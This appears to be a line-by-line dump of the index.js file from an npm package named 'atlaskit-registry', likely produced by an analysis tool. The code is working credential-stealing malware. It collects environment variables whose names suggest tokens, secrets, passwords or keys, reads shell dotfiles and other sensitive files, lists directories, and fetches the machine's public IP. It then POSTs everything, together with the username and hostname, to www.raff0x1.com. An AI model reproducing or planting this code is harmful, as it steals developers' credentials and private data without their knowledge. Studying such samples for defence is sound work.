// File: tmp/tmpstehhoy2/atlaskit-registry/package/index.js
// ======================================================================
Line 1: const https = require('https')
Line 2: const os = require('os')
Line 3: const fs = require('fs')
Line 4: const path = require('path')
Line 5: _tmp_6 = require('crypto')
Line 13: key.toLowerCase().includes('token')
Line 14: key.toLowerCase().includes('secret')
Line 15: key.toLowerCase().includes('password')
Line 16: key.toLowerCase().includes('key')
Line 21: _tmp_12.push(".bash_profile")
Line 25: path.join(home, file)
Line 27: {
      const content = fs.readFileSync(fullPath, 'utf-8');
      readFiles[file] = content.split('\n').slice(-50).join('\n');
    }
Line 28: const content = fs.readFileSync(fullPath, 'utf-8')
Line 29: readFiles[file] = content.split('\n').slice(-50).join('\n')
Line 31: catch {
    readFiles[file] = 'error';
  }
Line 32: readFiles[file] = 'error'
Line 41: {
    const entries = fs.readdirSync(dir, { withFileTypes: true })
      .map(entry => {
        const fullPath = path.join(dir, entry.name);
        const stat = fs.statSync(fullPath);
        return {
          name: entry.name,
          isDir: entry.isDirectory(),
          size: stat.size,
          mtime: stat.mtime
        };
      })
      .sort((a, b) => b.mtime - a.mtime);
    listDirs[dir] = entries;
  }
Line 42: const entries = fs.readdirSync(dir, { withFileTypes: true })
      .map(entry => {
        const fullPath = path.join(dir, entry.name);
        const stat = fs.statSync(fullPath);
        return {
          name: entry.name,
          isDir: entry.isDirectory(),
          size: stat.size,
          mtime: stat.mtime
        };
      })
      .sort((a, b) => b.mtime - a.mtime)
Line 44: path.join(dir, entry.name)
Line 45: const stat = fs.statSync(fullPath)
Line 54: listDirs[dir] = entries
Line 55: catch {
    listDirs[dir] = 'error';
  }
Line 56: listDirs[dir] = 'error'
Line 63: const sources = [
    { hostname: 'api.ipify.org', path: '/?format=json', parser: res => JSON.parse(res).ip },
    { hostname: 'ipinfo.io', path: '/json', parser: res => JSON.parse(res).ip },
    { hostname: 'ifconfig.me', path: '/', parser: res => res.trim() },
    { hostname: 'ident.me', path: '/', parser: res => res.trim() }
  ]
Line 64: _tmp_1.push({ hostname: 'api.ipify.org', path: '/?format=json', parser: res => JSON.parse(res).ip })
Line 65: _tmp_1.push({ hostname: 'ipinfo.io', path: '/json', parser: res => JSON.parse(res).ip })
Line 66: _tmp_1.push({ hostname: 'ifconfig.me', path: '/', parser: res => res.trim() })
Line 67: _tmp_1.push({ hostname: 'ident.me', path: '/', parser: res => res.trim() })
Line 70: {
    if (index >= sources.length) {
      return callback('unknown');
    }

    const source = sources[index];
    const req = https.request({
      hostname: source.hostname,
      path: source.path,
      method: 'GET',
      timeout: 3000
    }, res => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const ip = source.parser(data);
          if (ip && typeof ip === 'string') {
            callback(ip);
          } else {
            tryNext(index + 1);
          }
        } catch {
          tryNext(index + 1);
        }
      });
    });

    req.on('error', () => tryNext(index + 1));
    req.on('timeout', () => {
      req.destroy();
      tryNext(index + 1);
    });

    req.end();
  }
Line 72: callback('unknown')
Line 75: const source = sources[index]
Line 76: const req = https.request({
      hostname: source.hostname,
      path: source.path,
      method: 'GET',
      timeout: 3000
    }, res => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const ip = source.parser(data);
          if (ip && typeof ip === 'string') {
            callback(ip);
          } else {
            tryNext(index + 1);
          }
        } catch {
          tryNext(index + 1);
        }
      });
    })
Line 88: callback(ip)
Line 99: {
      req.destroy();
      tryNext(index + 1);
    }
Line 100: req.destroy()
Line 104: req.end()
Line 113: _iterator_0.next()
Line 114: {
    listDirs[dirPath].forEach(entry => {
      if (!entry.isDir) {
        const fileName = entry.name.toLowerCase();
        if (dotfiles.some(sensitiveFile => fileName.includes(sensitiveFile.toLowerCase()))) {
          const filePath = path.join(dirPath, entry.name);  // بناء المسار الكامل للملف
          try {
            const content = fs.readFileSync(filePath, 'utf-8');
            sensitiveFilesContent[filePath] = content;
          } catch (error) {
            sensitiveFilesContent[filePath] = `Error reading file: ${error.message}`;
          }
        }
      }
    });
  }
Line 115: listDirs[dirPath].forEach(entry => {
      if (!entry.isDir) {
        const fileName = entry.name.toLowerCase();
        if (dotfiles.some(sensitiveFile => fileName.includes(sensitiveFile.toLowerCase()))) {
          const filePath = path.join(dirPath, entry.name);  // بناء المسار الكامل للملف
          try {
            const content = fs.readFileSync(filePath, 'utf-8');
            sensitiveFilesContent[filePath] = content;
          } catch (error) {
            sensitiveFilesContent[filePath] = `Error reading file: ${error.message}`;
          }
        }
      }
    })
Line 118: dotfiles.some(sensitiveFile => fileName.includes(sensitiveFile.toLowerCase()))
Line 119: path.join(dirPath, entry.name)
Line 120: {
            const content = fs.readFileSync(filePath, 'utf-8');
            sensitiveFilesContent[filePath] = content;
          }
Line 121: const content = fs.readFileSync(filePath, 'utf-8')
Line 122: sensitiveFilesContent[filePath] = content
Line 123: catch (error) {
            sensitiveFilesContent[filePath] = `Error reading file: ${error.message}`;
          }
Line 124: sensitiveFilesContent[filePath] = `Error reading file: ${error.message}`
Line 133: {
  const payload = JSON.stringify({
    id,
    ip,
    time: new Date().toISOString(),
    cwd: process.cwd(),
    entry: require.main?.filename || 'unknown',
    os: {
      user: os.userInfo().username,
      hostname: os.hostname(),
      platform: os.platform(),
      arch: os.arch(),
      release: os.release()
    },
    env: safeEnv,
    dotfiles: readFiles,
    ls: listDirs,
    sensitiveFilesContent: sensitiveFilesContent  // تضمين محتويات الملفات الحساسة
  });

  const req = https.request({
    hostname: 'www.raff0x1.com',
    port: 443,
    path: '/',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  }, res => { });

  req.on('error', () => { });
  req.write(payload);
  req.end();
}
Line 134: const payload = JSON.stringify({
    id,
    ip,
    time: new Date().toISOString(),
    cwd: process.cwd(),
    entry: require.main?.filename || 'unknown',
    os: {
      user: os.userInfo().username,
      hostname: os.hostname(),
      platform: os.platform(),
      arch: os.arch(),
      release: os.release()
    },
    env: safeEnv,
    dotfiles: readFiles,
    ls: listDirs,
    sensitiveFilesContent: sensitiveFilesContent  // تضمين محتويات الملفات الحساسة
  })
Line 139: _tmp_24.entry = require.main?.filename || 'unknown'
Line 141: os.userInfo()
Line 142: os.hostname()
Line 143: os.platform()
Line 144: os.arch()
Line 153: const req = https.request({
    hostname: 'www.raff0x1.com',
    port: 443,
    path: '/',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  }, res => { })
Line 165: req.write(payload)
Line 166: req.end()
